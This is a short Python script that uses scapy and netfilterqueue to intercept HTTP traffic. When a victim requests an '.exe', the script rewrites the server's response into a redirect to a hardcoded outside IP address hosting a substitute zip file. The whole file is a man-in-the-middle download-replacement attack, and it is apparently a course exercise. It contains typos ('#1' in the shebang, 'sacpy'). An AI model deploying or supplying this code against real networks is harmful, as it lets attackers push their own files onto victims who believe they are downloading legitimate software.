#1/usr/bin/python

import scapy.all as scapy
import netfilterqueue

ack_list = []

def process_packet(packet):
    # print(packet)
    # read data inside of packets
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            print("HTTP Request")
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print(scapy_packet.show())
                # we have to manually initiate TCP handshake before serving target an intended download file
                # or you can modify the response without initiating handshake
        elif scapy_packet[scapy.TCP].sport == 80:
            print("HTTP Response")
            if scapy_packet[sacpy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[sacpy.TCP].seq)
                print("[+] Replacing file")
                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://140.227.227.74/kali/maclist.zip\n\n"

                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum

                packet.set_payload(str(scapy_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet) # 0: queue-num
queue.run()
